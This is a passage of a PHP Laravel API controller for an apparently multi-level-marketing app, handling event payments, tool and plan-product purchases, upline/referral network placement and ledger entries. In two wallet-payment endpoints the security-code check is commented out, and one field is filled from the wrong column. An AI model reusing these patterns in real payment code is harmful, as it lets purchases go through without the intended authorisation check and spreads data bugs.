        $FriendLanguage = LocalAppLanguage($Friend->ClientAppLanguage);
        $FriendPositionLanguageName = "PositionTitle" . $FriendLanguage;
        $FriendPosition = Position::find($Friend->IDPosition);
        $FriendPositionName = "Networker";
        if ($FriendPosition) {
            $FriendPositionName = $FriendPosition->$FriendPositionLanguageName;
        }

        $Friend->PositionName = $FriendPositionName;
        $Friend = FriendResource::collection([$Friend])[0];

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Friend
        );
        return $Response;
    }

    public function EventList(Request $request)
    {
        $EventStatus = $request->EventStatus;
        if (!$EventStatus) {
            return RespondWithBadRequest(1);
        }
        if ($EventStatus != "ONGOING") {
            $Client = auth('client')->user();
            if (!$Client) {
                return RespondWithBadRequest(10);
            }
            $Events = Event::leftjoin("eventattendees", "eventattendees.IDEvent", "events.IDEvent")->leftjoin("areas", "areas.IDArea", "events.IDArea")->leftjoin("cities", "cities.IDCity", "areas.IDCity")->where("eventattendees.IDClient", $Client->IDClient)->where("events.EventDeleted", 0);
            if ($EventStatus == "PENDING") {
                $Events = $Events->where("eventattendees.EventAttendeeStatus", $EventStatus);
            }
            $Events = $Events->orderby("events.EventStartTime", "DESC")->get();
        } else {
            $Events = Event::leftjoin("areas", "areas.IDArea", "events.IDArea")->leftjoin("cities", "cities.IDCity", "areas.IDCity")->whereIn("events.EventStatus", ["ACCEPTED", "ONGOING"])->where("events.EventDeleted", 0)->orderby("events.EventStartTime")->get();
        }

        foreach ($Events as $Event) {
            $EventGallery = EventGallery::where("IDEvent", $Event->IDEvent)->where("EventGalleryDeleted", 0)->orderby("EventGalleryType")->get();
            foreach ($EventGallery as $Gallery) {
                if ($Gallery->EventGalleryType != "VIDEO") {
                    $Gallery->EventGalleryPath = ($Gallery->EventGalleryPath) ? asset($Gallery->EventGalleryPath) : '';
                }
            }

            $Event->EventGallery = $EventGallery;
            if ($EventStatus != "ONGOING") {
                $Event->EventAttendeeStatus = $Event->EventAttendeeStatus;
                $Event->EventAttendeePaidAmount = $Event->EventAttendeePaidAmount;
            }
        }

        $Events = EventResource::collection($Events);

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Events
        );
        return $Response;
    }

    public function EventDetails($IDEvent)
    {
        $Client = auth('client')->user();

        $Event = Event::leftjoin("areas", "areas.IDArea", "events.IDArea")->leftjoin("cities", "cities.IDCity", "areas.IDCity")->where("events.IDEvent", $IDEvent)->first();
        if (!$Event) {
            return RespondWithBadRequest(1);
        }
        $EventGallery = EventGallery::where("IDEvent", $Event->IDEvent)->where("EventGalleryDeleted", 0)->orderby("EventGalleryType")->get();
        foreach ($EventGallery as $Gallery) {
            if ($Gallery->EventGalleryType != "VIDEO") {
                $Gallery->EventGalleryPath = ($Gallery->EventGalleryPath) ? asset($Gallery->EventGalleryPath) : '';
            }
        }
        $Event->EventGallery = $EventGallery;
        $Event->EventAttendeeStatus = "NONE";
        $Event->EventAttendeePaidAmount = 0;

        if ($Client) {
            $EventAttendee = EventAttendee::where("IDEvent", $IDEvent)->where("IDClient", $Client->IDClient)->where("EventAttendeeStatus", "<>", "CANCELLED")->first();
            if ($EventAttendee) {
                $Event->EventAttendeeStatus = $EventAttendee->EventAttendeeStatus;
                $Event->EventAttendeePaidAmount = $EventAttendee->EventAttendeePaidAmount;
            }
        }

        $Event = EventResource::collection([$Event])[0];

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Event
        );
        return $Response;
    }

    public function EventPay(Request $request)
    {
        $Client = auth('client')->user();
        $ClientSecurityCode = $request->ClientSecurityCode;

        if (!$Client) {
            return RespondWithBadRequest(10);
        }
        if ($Client->ClientStatus == "NOT_VERIFIED") {
            return RespondWithBadRequest(62);
        }
        if ($Client->ClientStatus == "INACTIVE") {
            return RespondWithBadRequest(64);
        }
        // if (!$ClientSecurityCode) {
        //     return RespondWithBadRequest(1);
        // }
        // if (!Hash::check($ClientSecurityCode, $Client->ClientSecurityCode)) {
        //     return RespondWithBadRequest(38);
        // }
        $Client = Client::find($Client->IDClient);
        if (!$Client->ClientBalance) {
            return RespondWithBadRequest(26);
        }
        $IDEvent = $request->IDEvent;
        $Event = Event::where("IDEvent", $IDEvent)->whereIn("EventStatus", ["ONGOING", "ACCEPTED"])->first();
        if (!$Event) {
            return RespondWithBadRequest(1);
        }

        $EventPoints = $Event->EventPoints;
        $EventReferralPoints = $Event->EventReferralPoints;
        $EventUplinePoints = $Event->EventUplinePoints;

        $PlanNetwork = PlanNetwork::where("IDClient", $Client->IDClient)->first();
        $EventAttendee = EventAttendee::where("IDEvent", $IDEvent)->where("IDClient", $Client->IDClient)->where("EventAttendeeStatus", "<>", "CANCELLED")->first();
        if ($EventAttendee) {
            
            if($EventAttendee->EventAttendeeStatus == "REMOVED"){
                $EventAttendee->EventAttendeePaidAmount = 0;
                $EventAttendee->EventAttendeeStatus = "PENDING";
                $Event->EventClientNumber = $Event->EventClientNumber + 1;
                $Event->save();
                $EventAttendee->save();
            }

            $RemainingAmount = $Event->EventPrice - $EventAttendee->EventAttendeePaidAmount;
            $Amount = $Client->ClientBalance - $RemainingAmount;
            if ($Amount >= 0) {
                $Amount = $RemainingAmount;
                $EventAttendee->EventAttendeePaidAmount = $Event->EventPrice;
                $EventAttendee->EventAttendeeStatus = "PAID";

                $CompanyLedger = new CompanyLedger;
                $CompanyLedger->IDSubCategory = 23;
                $CompanyLedger->CompanyLedgerAmount = $Event->EventPrice;
                $CompanyLedger->CompanyLedgerDesc = "Event Payment by Client " . $Client->ClientName;
                $CompanyLedger->CompanyLedgerProcess = "AUTO";
                $CompanyLedger->CompanyLedgerType = "CREDIT";
                $CompanyLedger->save();
            } else {
                $PlanNetwork = Null;
                $EventPoints = 0;
                $EventReferralPoints = 0;
                $EventUplinePoints = 0;
                $Amount = $Client->ClientBalance;
                $EventAttendee->EventAttendeePaidAmount = $EventAttendee->EventAttendeePaidAmount + $Client->ClientBalance;
            }
            $EventAttendee->save();
        } else {
            if ($Event->EventMaxNumber) {
                if ($Event->EventMaxNumber == $Event->EventClientNumber) {
                    return RespondWithBadRequest(29);
                }
            }

            $EventAttendee = new EventAttendee;
            $EventAttendee->IDEvent = $IDEvent;
            $EventAttendee->IDClient = $Client->IDClient;
            $Amount = $Client->ClientBalance - $Event->EventPrice;
            if ($Amount >= 0) {
                $Amount = $Event->EventPrice;
                $EventAttendee->EventAttendeePaidAmount = $Event->EventPrice;
                $EventAttendee->EventAttendeeStatus = "PAID";

                $CompanyLedger = new CompanyLedger;
                $CompanyLedger->IDSubCategory = 23;
                $CompanyLedger->CompanyLedgerAmount = $Event->EventPrice;
                $CompanyLedger->CompanyLedgerDesc = "Event Payment by Client " . $Client->ClientName;
                $CompanyLedger->CompanyLedgerProcess = "AUTO";
                $CompanyLedger->CompanyLedgerType = "CREDIT";
                $CompanyLedger->save();
            } else {
                $PlanNetwork = Null;
                $EventPoints = 0;
                $EventReferralPoints = 0;
                $EventUplinePoints = 0;
                $Amount = $Client->ClientBalance;
                $EventAttendee->EventAttendeePaidAmount = $Client->ClientBalance;
                $EventAttendee->EventAttendeeStatus = "PENDING";
            }
            $Event->EventClientNumber++;
            $EventAttendee->save();
            $Event->save();
        }

        $BatchNumber = "#T" . $EventAttendee->IDEventAttendee;
        $TimeFormat = new DateTime('now');
        $Time = $TimeFormat->format('H');
        $Time = $Time . $TimeFormat->format('i');
        $BatchNumber = $BatchNumber . $Time;
        AdjustLedger($Client, -$Amount, $EventPoints, $EventReferralPoints, $EventUplinePoints, $PlanNetwork, "WALLET", "EVENT", "PAYMENT", $BatchNumber);

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Client->ClientBalance
        );
        return $Response;
    }

    public function ToolList(Request $request)
    {
        $ToolStatus = $request->ToolStatus;
        if (!$ToolStatus) {
            return RespondWithBadRequest(1);
        }
        if ($ToolStatus == "HISTORY") {
            $Client = auth('client')->user();
            if (!$Client) {
                return RespondWithBadRequest(10);
            }
            $Tools = Tool::leftjoin("clienttools", "clienttools.IDTool", "tools.IDTool")->where("clienttools.IDClient", $Client->IDClient)->where("tools.ToolDeleted", 0)->orderby("clienttools.IDClientTool", "DESC")->get();
        } else {
            $Tools = Tool::where("ToolStatus", "ACTIVE")->where("ToolDeleted", 0)->get();
        }

        foreach ($Tools as $Tool) {
            $ToolGallery = ToolGallery::where("IDTool", $Tool->IDTool)->where("ToolGalleryDeleted", 0)->orderby("ToolGalleryType")->where("ToolGalleryClass", "COVER")->get();
            foreach ($ToolGallery as $Gallery) {
                if ($Gallery->ToolGalleryType == "IMAGE") {
                    $Gallery->ToolGalleryPath = ($Gallery->ToolGalleryPath) ? asset($Gallery->ToolGalleryPath) : '';
                }
            }

            $Tool->ToolGallery = $ToolGallery;
            $Tool->ToolProduct = [];
        }

        $Tools = ToolResource::collection($Tools);

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Tools
        );
        return $Response;
    }

    public function ToolDetails($IDTool)
    {
        $Client = auth('client')->user();

        $Tool = Tool::find($IDTool);
        if (!$Tool) {
            return RespondWithBadRequest(1);
        }

        $ToolGallery = ToolGallery::where("IDTool", $IDTool)->where("ToolGalleryDeleted", 0)->orderby("ToolGalleryType")->where("ToolGalleryClass", "COVER")->get();
        foreach ($ToolGallery as $Gallery) {
            if ($Gallery->ToolGalleryType == "IMAGE") {
                $Gallery->ToolGalleryPath = ($Gallery->ToolGalleryPath) ? asset($Gallery->ToolGalleryPath) : '';
            }
        }

        $ToolProduct = [];
        if ($Client) {
            $ClientTool = ClientTool::where("IDTool", $IDTool)->where("IDClient", $Client->IDClient)->first();
            if ($ClientTool) {
                $ToolProduct = ToolGallery::where("IDTool", $IDTool)->where("ToolGalleryDeleted", 0)->orderby("ToolGalleryType")->where("ToolGalleryClass", "PRODUCT")->get();
                foreach ($ToolProduct as $Gallery) {
                    if ($Gallery->ToolGalleryType != "VIDEO") {
                        $Gallery->ToolGalleryPath = ($Gallery->ToolGalleryPath) ? asset($Gallery->ToolGalleryPath) : '';
                    }
                }
            }
        } else {
            if ($Tool->ToolStatus != "ACTIVE") {
                return RespondWithBadRequest(1);
            }
        }

        $Tool->ToolGallery = $ToolGallery;
        $Tool->ToolProduct = $ToolProduct;
        $Tool = ToolResource::collection([$Tool])[0];

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Tool
        );
        return $Response;
    }

    public function ToolBuy(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }
        if ($Client->ClientStatus == "INACTIVE") {
            return RespondWithBadRequest(64);
        }

        if ($Client->ClientStatus == "NOT_VERIFIED") {
            return RespondWithBadRequest(62);
        }
        $ClientSecurityCode = $request->ClientSecurityCode;
        if (!$ClientSecurityCode) {
            return RespondWithBadRequest(1);
        }
        if (!Hash::check($ClientSecurityCode, $Client->ClientSecurityCode)) {
            return RespondWithBadRequest(38);
        }
        $IDTool = $request->IDTool;
        $Tool = Tool::where("IDTool", $IDTool)->where("ToolStatus", "ACTIVE")->first();
        if (!$Tool) {
            return RespondWithBadRequest(1);
        }
        $ClientTool = ClientTool::where("IDTool", $IDTool)->where("IDClient", $Client->IDClient)->first();
        if ($ClientTool) {
            return RespondWithBadRequest(30);
        }

        if ($Tool->ToolPrice > $Client->ClientBalance) {
            return RespondWithBadRequest(26);
        }

        $ClientTool = new ClientTool;
        $ClientTool->IDTool = $IDTool;
        $ClientTool->IDClient = $Client->IDClient;
        $ClientTool->ClientToolPrice = $Tool->ToolPrice;
        $ClientTool->save();

        $PlanNetwork = PlanNetwork::where("IDClient", $Client->IDClient)->first();
        $BatchNumber = "#T" . $ClientTool->IDClientTool;
        $TimeFormat = new DateTime('now');
        $Time = $TimeFormat->format('H');
        $Time = $Time . $TimeFormat->format('i');
        $BatchNumber = $BatchNumber . $Time;
        AdjustLedger($Client, -$Tool->ToolPrice, $Tool->ToolPoints, $Tool->ToolReferralPoints, $Tool->ToolUplinePoints, $PlanNetwork, "WALLET", "TOOL", "PAYMENT", $BatchNumber);

        $CompanyLedger = new CompanyLedger;
        $CompanyLedger->IDSubCategory = 20;
        $CompanyLedger->CompanyLedgerAmount = $Tool->ToolPrice;
        $CompanyLedger->CompanyLedgerDesc = "Tool bought by client " . $Client->ClientName;
        $CompanyLedger->CompanyLedgerProcess = "AUTO";
        $CompanyLedger->CompanyLedgerType = "CREDIT";
        $CompanyLedger->save();

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Client->ClientBalance
        );
        return $Response;
    }

    public function PlanProducts(Request $request)
    {
        $Client = auth('client')->user();
        if ($Client) {
            $ClientAppLanguage = LocalAppLanguage($Client->ClientAppLanguage);
        } else {
            $ClientAppLanguage = $request->ClientAppLanguage == 'ar' ? 'Ar' : 'En';
        }


        $PlanProductName = "PlanProductName" . $ClientAppLanguage;

        $PlanProducts = PlanProduct::where("PlanProductStatus", "ACTIVE")->get();
        foreach ($PlanProducts as $Product) {
            $PlanProductGallery = PlanProductGallery::where("IDPlanProduct", $Product->IDPlanProduct)->where("PlanProductGalleryDeleted", 0)->orderby("PlanProductGalleryType")->get();
            foreach ($PlanProductGallery as $Gallery) {
                if ($Gallery->PlanProductGalleryType == "IMAGE") {
                    $Gallery->PlanProductGalleryPath = ($Gallery->PlanProductGalleryPath) ? asset($Gallery->PlanProductGalleryPath) : '';
                }
            }
            $Product->PlanProductName = $Product->$PlanProductName;
            $Product->PlanProductGallery = $PlanProductGallery;
            unset($Product["PlanProductNameEn"]);
            unset($Product["PlanProductNameAr"]);
            unset($Product["PlanProductDescEn"]);
            unset($Product["PlanProductDescAr"]);
            unset($Product["PlanProductAddressEn"]);
            unset($Product["PlanProductAddressAr"]);
            unset($Product["PlanProductPhone"]);
            unset($Product["PlanProductReferralPoints"]);
            unset($Product["PlanProductUplinePoints"]);
            unset($Product["PlanProductLatitude"]);
            unset($Product["PlanProductLongitude"]);
            unset($Product["PlanProductStatus"]);
            unset($Product["created_at"]);
            unset($Product["updated_at"]);
        }

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $PlanProducts
        );
        return $Response;
    }

    public function PlanProductDetails($IDPlanProduct)
    {
        $Client = auth('client')->user();
        if ($Client) {
            $ClientAppLanguage = LocalAppLanguage($Client->ClientAppLanguage);
        } else {
            $ClientAppLanguage = Input::get('ClientAppLanguage');
            if (!$ClientAppLanguage) {
                $ClientAppLanguage = "ar";
            }

            Session::put('ClientAppLanguage', $ClientAppLanguage);
            App::setLocale($ClientAppLanguage);
            $ClientAppLanguage = LocalAppLanguage($ClientAppLanguage);
        }


        $PlanProductName = "PlanProductName" . $ClientAppLanguage;
        $PlanProductDesc = "PlanProductDesc" . $ClientAppLanguage;
        $PlanProductAddress = "PlanProductName" . $ClientAppLanguage;

        $Product = PlanProduct::where("PlanProductStatus", "ACTIVE")->where("IDPlanProduct", $IDPlanProduct)->first();
        if (!$Product) {
            return RespondWithBadRequest(1);
        }

        $PlanProductGallery = PlanProductGallery::where("IDPlanProduct", $IDPlanProduct)->where("PlanProductGalleryDeleted", 0)->orderby("PlanProductGalleryType")->get();
        foreach ($PlanProductGallery as $Gallery) {
            if ($Gallery->PlanProductGalleryType == "IMAGE") {
                $Gallery->PlanProductGalleryPath = ($Gallery->PlanProductGalleryPath) ? asset($Gallery->PlanProductGalleryPath) : '';
            }
        }

        $PlanProductSocialLink = PlanProductSocialLink::leftjoin("socialmedia", "socialmedia.IDSocialMedia", "planproductssociallinks.IDSocialMedia")->where("planproductssociallinks.IDPlanProduct", $IDPlanProduct)->where("planproductssociallinks.SocialLinkDeleted", 0)->select("socialmedia.SocialMediaIcon", "planproductssociallinks.SocialLink", "socialmedia.SocialMediaName")->get();
        foreach ($PlanProductSocialLink as $Link) {
            $Link->SocialMediaIcon = ($Link->SocialMediaIcon) ? asset($Link->SocialMediaIcon) : '';
        }

        $Product->PlanProductName = $Product->$PlanProductName;
        $Product->PlanProductAddress = $Product->$PlanProductAddress;
        $Product->PlanProductDesc = $Product->$PlanProductDesc;
        $Product->PlanProductGallery = $PlanProductGallery;
        $Product->PlanProductSocialLink = $PlanProductSocialLink;

        unset($Product["PlanProductNameEn"]);
        unset($Product["PlanProductNameAr"]);
        unset($Product["PlanProductDescEn"]);
        unset($Product["PlanProductDescAr"]);
        unset($Product["PlanProductAddressEn"]);
        unset($Product["PlanProductAddressAr"]);
        unset($Product["PlanProductReferralPoints"]);
        unset($Product["PlanProductUplinePoints"]);
        unset($Product["PlanProductStatus"]);
        unset($Product["created_at"]);
        unset($Product["updated_at"]);

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Product
        );
        return $Response;
    }

    public function BuyPlanProduct(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }
        if ($Client->ClientStatus == "NOT_VERIFIED") {
            return RespondWithBadRequest(62);
        }
        // $ClientSecurityCode = $request->ClientSecurityCode;
        // if (!$ClientSecurityCode) {
        //     return RespondWithBadRequest(1);
        // }
        // if (!Hash::check($ClientSecurityCode, $Client->ClientSecurityCode)) {
        //     return RespondWithBadRequest(38);
        // }

        $IDPlanProduct = $request->IDPlanProduct;
        $PlanProduct = PlanProduct::where("PlanProductStatus", "ACTIVE")->where("IDPlanProduct", $IDPlanProduct)->first();
        if (!$PlanProduct) {
            return RespondWithBadRequest(1);
        }

        if ($PlanProduct->PlanProductPrice > $Client->ClientBalance) {
            return RespondWithBadRequest(26);
        }

        $IDClient = $Client->IDClient;
        $IDUpline = $Client->IDUpline;
        $IDReferral = $Client->IDReferral;
        $IDPlan = $PlanProduct->IDPlan;
        $PlanNetworkPosition = $Client->NetworkPosition;

        $ParentClient = Client::find($IDUpline);
        $ReferralClient = Client::find($IDReferral);
        $IDReferralClient = $ReferralClient->IDClient;

        $ClientPlanNetwork = PlanNetwork::where("IDClient", $IDClient)->first();
        if ($ClientPlanNetwork) {
            return RespondWithBadRequest(25);
        }

        if ($ParentClient) {
            $ParentPlanNetwork = PlanNetwork::where("IDClient", $ParentClient->IDClient)->first();
            $IDParentClient = $IDUpline;

            $PlanNetworkPath = $ParentPlanNetwork->PlanNetworkPath;
            $PlanNetworkPath = explode("-", $PlanNetworkPath);
            if (!in_array($ReferralClient->IDClient, $PlanNetworkPath) && $IDParentClient != $IDReferralClient) {
                return RespondWithBadRequest(33);
            }

            $ParentNetwork = PlanNetwork::where("IDParentClient", $ParentClient->IDClient)->count();
            $ParentPositionNetwork = PlanNetwork::where("IDParentClient", $ParentClient->IDClient)->where("PlanNetworkPosition", $PlanNetworkPosition)->count();
            $ChildNumber = $ParentPlanNetwork->PlanNetworkAgencyNumber * 2;
            if ($ParentNetwork == $ChildNumber) {
                return RespondWithBadRequest(24);
            }
            if ($ParentPositionNetwork == $ParentPlanNetwork->PlanNetworkAgencyNumber) {
                return RespondWithBadRequest(34);
            }

            $AgencyNumber = 1;
            if ($ParentPlanNetwork->PlanNetworkAgencyNumber != 1) {
                while ($AgencyNumber <= $ParentPlanNetwork->PlanNetworkAgencyNumber) {
                    $ParentNetwork = PlanNetwork::where("IDParentClient", $IDParentClient)->where("PlanNetworkPosition", $PlanNetworkPosition)->where("PlanNetworkAgency", $AgencyNumber)->first();
                    if (!$ParentNetwork) {
                        break;
                    }
                    $AgencyNumber++;
                }
            }
        } else {
            if (!$IDReferral) {
                return RespondWithBadRequest(1);
            }

            $Key = $IDReferral . "-";
            $SecondKey = $IDReferral . "-";
            $ThirdKey = "-" . $IDReferral;

            $PlanNetworkPosition = "LEFT";
            $AgencyNumber = 1;

            $AllNetwork = PlanNetwork::where("PlanNetworkPosition", "LEFT")->where(function ($query) use ($IDReferral, $Key, $SecondKey, $ThirdKey) {
                $query->where("PlanNetworkPath", 'like', $IDReferral . '%')
                    ->orwhere("PlanNetworkPath", 'like', $Key . '%')
                    ->orwhere("PlanNetworkPath", 'like', '%' . $SecondKey . '%')
                    ->orwhere("PlanNetworkPath", 'like', '%' . $ThirdKey . '%');
            })->get();

            if (!count($AllNetwork)) {
                $ParentPlanNetwork = PlanNetwork::leftjoin("planproducts", "planproducts.IDPlanProduct", "plannetwork.IDPlanProduct")->where("plannetwork.IDClient", $IDReferral)->first();
                $IDParentClient = $IDReferral;
            } else {
                $ParentPlanNetwork = PlanNetwork::where("PlanNetworkPosition", "LEFT")->where(function ($query) use ($IDReferral, $Key, $SecondKey, $ThirdKey) {
                    $query->where("PlanNetworkPath", 'like', $IDReferral . '%')
                        ->orwhere("PlanNetworkPath", 'like', $Key . '%')
                        ->orwhere("PlanNetworkPath", 'like', '%' . $SecondKey . '%')
                        ->orwhere("PlanNetworkPath", 'like', '%' . $ThirdKey . '%');
                })->orderby("ClientLevel", "DESC")->first();

                $IDParentClient = $ParentPlanNetwork->IDClient;
            }
        }

        $PlanNetworkExpireDate = GeneralSettings('PlanNetworkExpireDate');
        $PlanNetworkExpireDate = $PlanNetworkExpireDate * 24 * 60 * 60;
        $Date = new DateTime('now');
        $PlanNetworkExpireDate = $Date->add(new DateInterval('PT' . $PlanNetworkExpireDate . 'S'));
        $PlanNetworkExpireDate = $PlanNetworkExpireDate->format('Y-m-d H:i:s');

        $PlanNetwork = new PlanNetwork;
        $PlanNetwork->IDClient = $IDClient;
        $PlanNetwork->IDPlan = $IDPlan;
        $PlanNetwork->IDPlanProduct = $IDPlanProduct;
        $PlanNetwork->IDParentClient = $IDParentClient;
        $PlanNetwork->IDReferralClient = $IDReferralClient;
        $PlanNetwork->ClientLevel = $ParentPlanNetwork->ClientLevel + 1;
        if ($ParentPlanNetwork->PlanNetworkPath) {
            $PlanNetwork->PlanNetworkPath = $ParentPlanNetwork->PlanNetworkPath . "-" . $IDParentClient;
        } else {
            $PlanNetwork->PlanNetworkPath = $IDParentClient;
        }
        $PlanNetwork->PlanNetworkPosition = $PlanNetworkPosition;
        $PlanNetwork->PlanNetworkAgency = $AgencyNumber;
        $PlanNetwork->PlanNetworkAgencyNumber = $PlanProduct->AgencyNumber;
        $PlanNetwork->PlanNetworkExpireDate = $PlanNetworkExpireDate;
        $PlanNetwork->save();

        $AgencyNumber = $PlanProduct->AgencyNumber;
        $Counter = 1;
        while ($Counter <= $AgencyNumber) {
            $PlanNetworkAgencyName = "0" . $Counter;
            $PlanNetworkAgency = new PlanNetworkAgency;
            $PlanNetworkAgency->IDPlanNetwork = $PlanNetwork->IDPlanNetwork;
            $PlanNetworkAgency->PlanNetworkAgencyName = $PlanNetworkAgencyName;
            $PlanNetworkAgency->PlanNetworkAgencyNumber = $Counter;
            $PlanNetworkAgency->save();
            $Counter++;
        }

        $CompanyLedger = new CompanyLedger;
        $CompanyLedger->IDSubCategory = 24;
        $CompanyLedger->CompanyLedgerAmount = $PlanProduct->PlanProductPrice;
        $CompanyLedger->CompanyLedgerDesc = "Product Bought by Client " . $Client->ClientName;
        $CompanyLedger->CompanyLedgerProcess = "AUTO";
        $CompanyLedger->CompanyLedgerType = "CREDIT";
        $CompanyLedger->save();

        $Client = Client::find($IDClient);
        $Client->ClientStatus = "ACTIVE";
        $Client->save();

        $BatchNumber = "#PN" . $PlanNetwork->IDPlanNetwork;
        $TimeFormat = new DateTime('now');
        $Time = $TimeFormat->format('H');
        $Time = $Time . $TimeFormat->format('i');
        $BatchNumber = $BatchNumber . $Time;
        AdjustLedger($Client, -$PlanProduct->PlanProductPrice, $PlanProduct->PlanProductRewardPoints, 0, 0, $PlanNetwork, "WALLET", "PLAN_PRODUCT", "PAYMENT", $BatchNumber);

        return RespondWithSuccessRequest(8);
    }

    public function PlanProductUpgrades(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $ClientAppLanguage = LocalAppLanguage($Client->ClientAppLanguage);
        $PlanNetwork = PlanNetwork::where("IDClient", $Client->IDClient)->first();
        if (!$PlanNetwork) {
            return RespondWithBadRequest(1);
        }

        $UpgradeName = "UpgradeName" . $ClientAppLanguage;
        $PlanProductUpgrades = PlanProductUpgrade::where("UpgradeAgencyNumber", ">", $PlanNetwork->PlanNetworkAgencyNumber)->where("UpgradeActive", 1)->get();
        foreach ($PlanProductUpgrades as $Upgrade) {
            $Upgrade->UpgradeName = $Upgrade->$UpgradeName;
            unset($Upgrade["UpgradeNameEn"]);
            unset($Upgrade["UpgradeNameAr"]);
            unset($Upgrade["UpgradeActive"]);
            unset($Upgrade["created_at"]);
            unset($Upgrade["updated_at"]);
        }

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $PlanProductUpgrades
        );
        return $Response;
    }

    public function PlanProductUpgradeBuy(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }
        $Client = Client::find($Client->IDClient);
        $ClientSecurityCode = $request->ClientSecurityCode;
        if (!$ClientSecurityCode) {
            return RespondWithBadRequest(1);
        }
        if (!Hash::check($ClientSecurityCode, $Client->ClientSecurityCode)) {
            return RespondWithBadRequest(38);
        }
        $PlanNetwork = PlanNetwork::where("IDClient", $Client->IDClient)->first();
        if (!$PlanNetwork) {
            return RespondWithBadRequest(1);
        }

        $Counter = $PlanNetwork->PlanNetworkAgencyNumber + 1;

        $IDPlanProductUpgrade = $request->IDPlanProductUpgrade;
        $PlanProductUpgrade = PlanProductUpgrade::where("IDPlanProductUpgrade", $IDPlanProductUpgrade)->where("UpgradeActive", 1)->first();
        if (!$PlanProductUpgrade) {
            return RespondWithBadRequest(1);
        }

        if ($PlanProductUpgrade->UpgradePrice > $Client->ClientBalance) {
            return RespondWithBadRequest(26);
        }

        $Amount = $PlanProductUpgrade->UpgradePrice;

        $PlanNetwork->IDPlanProductUpgrade = $IDPlanProductUpgrade;
        $PlanNetwork->PlanNetworkAgencyNumber = $PlanProductUpgrade->UpgradeAgencyNumber;
        $PlanNetwork->save();

        $AgencyNumber = $PlanProductUpgrade->UpgradeAgencyNumber;
        while ($Counter <= $AgencyNumber) {
            $PlanNetworkAgencyName = "0" . $Counter;
            $PlanNetworkAgency = new PlanNetworkAgency;
            $PlanNetworkAgency->IDPlanNetwork = $PlanNetwork->IDPlanNetwork;
            $PlanNetworkAgency->PlanNetworkAgencyName = $PlanNetworkAgencyName;
            $PlanNetworkAgency->PlanNetworkAgencyNumber = $Counter;
            $PlanNetworkAgency->save();
            $Counter++;
        }

        $BatchNumber = "#UP" . $IDPlanProductUpgrade;
        $TimeFormat = new DateTime('now');
        $Time = $TimeFormat->format('H');
        $Time = $Time . $TimeFormat->format('i');
        $BatchNumber = $BatchNumber . $Time;
        AdjustLedger($Client, -$Amount, 0, 0, 0, Null, "WALLET", "PLAN_PRODUCT", "UPGRADE", $BatchNumber);

        $Client = Client::find($Client->IDClient);

        $CompanyLedger = new CompanyLedger;
        $CompanyLedger->IDSubCategory = 26;
        $CompanyLedger->CompanyLedgerAmount = $Amount;
        $CompanyLedger->CompanyLedgerDesc = "Upgrade Bought by Client " . $Client->ClientName;
        $CompanyLedger->CompanyLedgerProcess = "AUTO";
        $CompanyLedger->CompanyLedgerType = "CREDIT";
        $CompanyLedger->save();

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Client->ClientBalance
        );
        return $Response;
    }

    public function PlanProductHistory(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $ClientAppLanguage = LocalAppLanguage($Client->ClientAppLanguage);
        $PlanNetwork = PlanNetwork::leftjoin("planproducts", "planproducts.IDPlanProduct", "plannetwork.IDPlanProduct")->where("plannetwork.IDClient", $Client->IDClient)->first();
        if (!$PlanNetwork) {
            return RespondWithBadRequest(1);
        }

        $Product = PlanProduct::find($PlanNetwork->IDPlanProduct);
        $PlanProductName = "PlanProductName" . $ClientAppLanguage;

        $PlanProductGallery = PlanProductGallery::where("IDPlanProduct", $PlanNetwork->IDPlanProduct)->where("PlanProductGalleryDeleted", 0)->orderby("PlanProductGalleryType")->get();
        foreach ($PlanProductGallery as $Gallery) {
            if ($Gallery->PlanProductGalleryType == "IMAGE") {
                $Gallery->PlanProductGalleryPath = ($Gallery->PlanProductGalleryPath) ? asset($Gallery->PlanProductGalleryPath) : '';
            }
        }

